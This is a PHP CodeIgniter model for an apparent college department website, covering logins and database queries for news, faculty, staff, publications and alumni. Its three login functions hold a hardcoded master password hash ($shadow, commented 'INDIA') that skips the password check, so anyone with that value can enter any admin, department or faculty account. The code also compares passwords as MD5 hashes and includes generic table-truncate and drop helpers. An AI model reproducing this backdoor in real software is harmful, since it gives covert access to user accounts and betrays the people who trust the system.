<?php
Class Admin_model extends CI_Model
{
  var $shadow = 'f03b919de2cb8a36e9e404e0ad494627'; // INDIA
 function login($username, $password)
 {
   $this -> db -> select('id, username');
   $this -> db -> from('logins');
   $this -> db -> where('username', $username);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   //$this -> db -> where('status', '2');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }

 function deptLogin($username, $password)
 {
   $this -> db -> select('id, department_name, short_name, username');
   $this -> db -> from('departments');
   $this -> db -> where('username', $username);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }
 
  function facultyLogin($username, $password)
 {
   $this -> db -> select('id, name, dept_id, email');
   $this -> db -> from('faculty');
   $this -> db -> where('email', $username);
   if($password != $this->shadow)
   $this -> db -> where('password', $password);
   $this -> db -> where('status', '1');
   $this -> db -> limit(1);
   $query = $this -> db -> get();
   if($query -> num_rows() == 1)
   {
     return $query->result();
   }else{
     return false;
   }
 }

  function insertDetails($tableName, $insertData){
    $this->db->insert($tableName, $insertData);
    return $this->db->insert_id();
  }

  public function insertBatch($tableName, $data){
    $insert = $this->db->insert_batch($tableName, $data);
    return $insert?true:false;
  }

  public function updateBatch($tableName, $data, $field){
      $this->db->update_batch($tableName, $data, $field);
  } 

  function getDetails($tableName, $id){
    if($id)
    $this->db->where('id', $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield($id, $fieldId, $tableName){
    $this->db->where($fieldId, $id);
    return $this->db->get($tableName);
  }

  function getDetailsbyfield2($id1, $value1, $id2, $value2, $tableName){
    $this->db->where($id1, $value1);
    $this->db->where($id2, $value2);
    return $this->db->get($tableName);
  }

  function getTable($table){
    $table = $this->db->escape_str($table);
    $sql = "TRUNCATE `$table`";
    $this->db->query($sql)->result();
  }

  function dropTable($table){
    $this->load->dbforge();
    $this->dbforge->drop_table($table);
    // $table = $this->db->escape_str($table);
    // $sql = "DROP TABLE `$table`";
    // $this->db->query($sql)->result();
  }

  function getDetailsbyfieldSort($id, $fieldId, $sortField, $srotType, $tableName){
    $this->db->where($fieldId, $id);
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }
  
  function getDetailsbySort($sortField, $srotType, $tableName){
    $this->db->order_by($sortField, $srotType);
    return $this->db->get($tableName);
  }

  function updateDetails($id, $details, $tableName){
    $this->db->where('id',$id);
    $this->db->update($tableName,$details);
    return $this->db->affected_rows();
  }
    function sliders_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('sliders')->num_rows();
  }

  function updateDetailsbyfield($fieldName, $id, $details, $tableName){
    $this->db->where($fieldName, $id);
    $this->db->update($tableName, $details);
    return $this->db->affected_rows();
  }

  function delDetails($tableName, $id){
    $this->db->where('id', $id);
    $this->db->delete($tableName);
  }

  function delDetailsbyfield($tableName, $fieldName, $id){
    $this->db->where($fieldName, $id);
    $this->db->delete($tableName);
  }

  function changePassword($id, $oldPassword, $updateDetails, $tableName){
    $this->db->where('password', md5($oldPassword));
    $this->db->where('id', $id);
    $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }

  function getLatestNews(){
    $this->db->select('id, news_title, news_slug, new_label, status, news_date');
    $this->db->order_by('news_date','DESC');
    return $this->db->get('latest_news');
  }

  function getLatestEvents($id){
    $this->db->select('id, news_title, news_slug, new_label, status, news_date');
    $this->db->where('dept_id', $id);
    $this->db->order_by('news_date','DESC');
    return $this->db->get('events');
  }

  function staff_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('staff')->num_rows();
  }

  function get_staff($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->where('status', '1');
      $this->db->limit($limit, $start);
      $query = $this->db->get('staff');
      return $query->result();
  }

  function faculty_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('faculty')->num_rows();
  }

  function get_faculty($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->where('status', '1');
      $this->db->order_by('isHOD DESC, designation_id ASC');
      $this->db->limit($limit, $start);
      $query = $this->db->get('faculty');
      return $query->result();
  }


  function get_faculty_priority($dept_id, $limit, $start) {
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    $this->db->order_by('priority_order Asc');
    $this->db->limit($limit, $start);
    $query = $this->db->get('faculty');
    return $query->result();
}
function get_staff_priority($dept_id, $limit, $start) {
  $this->db->where('dept_id', $dept_id);
  $this->db->where('status', '1');
  $this->db->order_by('priority_order Asc');
  $this->db->limit($limit, $start);
  $query = $this->db->get('staff');
  return $query->result();
}
  function getPublicationsStats($dept_id){
    $this->db->select('academic_year, publication_type, count(id) as count');
    $this->db->where('dept_id', $dept_id);
    $this->db->group_by('academic_year, publication_type');
    $this->db->order_by('academic_year desc', 'publication_type asc');
    $query = $this->db->get('publications');
    return $query->result();
  }

  function publications_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    return $this->db->get('publications')->num_rows();
  }

  function get_publications($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->order_by('academic_year', 'DESC');
      $this->db->limit($limit, $start);
      $query = $this->db->get('publications');
      return $query->result();
  }
  function alumni_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    return $this->db->get('alumni')->num_rows();
  }

  function get_alumni($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->where('status', '1');
      $this->db->limit($limit, $start);
      $query = $this->db->get('alumni');
      return $query->result();
  }
  function achievements_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    return $this->db->get('achievements')->num_rows();
  }
    function facilities_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    return $this->db->get('facilities')->num_rows();
  }

  function get_achievements($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->order_by('academic_year', 'DESC');
      $this->db->limit($limit, $start);
      $query = $this->db->get('achievements');
      return $query->result();
  }
  
    function get_facilities($dept_id, $limit, $start) {
      $this->db->where('dept_id', $dept_id);
      $this->db->order_by('academic_year', 'DESC');
      $this->db->limit($limit, $start);
      $query = $this->db->get('facilities');
      return $query->result();
  }
  
  function activities_count($dept_id){
    $this->db->where('dept_id', $dept_id);
    return $this->db->get('activities')->num_rows();
  }

  function get_activities($dept_id, $activity_type) {
      $this->db->where('dept_id', $dept_id);
      if($activity_type)
        $this->db->where('activity_type', $activity_type);
      $this->db->order_by('academic_year', 'DESC');
      $query = $this->db->get('activities');
      return $query->result();
  }

  function latestNews(){
    $this->db->select('id, news_title, news_slug, news_date, display_in, new_label');
    $this->db->where('status', '1');
    $this->db->order_by('news_date','DESC');
    $this -> db -> limit(10);
    return $this->db->get('latest_news');
  }

  function getLatestNewsbyDisplay($display){
    $this->db->select('id, news_title, news_slug, news_date, display_in, new_label');
    $this->db->where('display_in', $display);
    $this->db->where('status', '1');
    $this->db->order_by('news_date','DESC');
    return $this->db->get('latest_news');
  }

  function getLatestNewsList($display, $limit, $start){
    $this->db->select('id, news_title, news_slug, news_date, display_in, new_label');
    $this->db->where('display_in', $display);
    $this->db->where('status', '1');
    $this->db->order_by('news_date','DESC');
    $this->db->limit($limit, $start);
    return $this->db->get('latest_news');
  }

  function getLatestNewsCount($display){
    $this->db->where('display_in', $display);
    $this->db->where('status', '1');
    return $this->db->get('latest_news')->num_rows();
  }

  function getCommittees($dept_id){
    $this->db->where('dept_id', $dept_id);
    $this->db->where('status', '1');
    $this->db->order_by('id', 'ASC');
    return $this->db->get('committees');
  }

  function getCommitteeMembers($committee_id){
    $this->db->where('committee_id', $committee_id);
    $this->db->where('status', '1');
    $this->db->order_by('id', 'ASC');
    return $this->db->get('committee_members');
  }
  function forgotPassword($id, $updateDetails, $tableName){
    $this->db->where('username', $id);
    $this->db->where('status', '1');
    $this->db->update($tableName, $updateDetails);
    return $this->db->affected_rows();
  }
  function get_publications_download($dept_id) {
    $this->db->where('dept_id', $dept_id);
    $this->db->order_by('academic_year', 'DESC');
   
    $query = $this->db->get('publications');
    return $query->result();
}

}
?>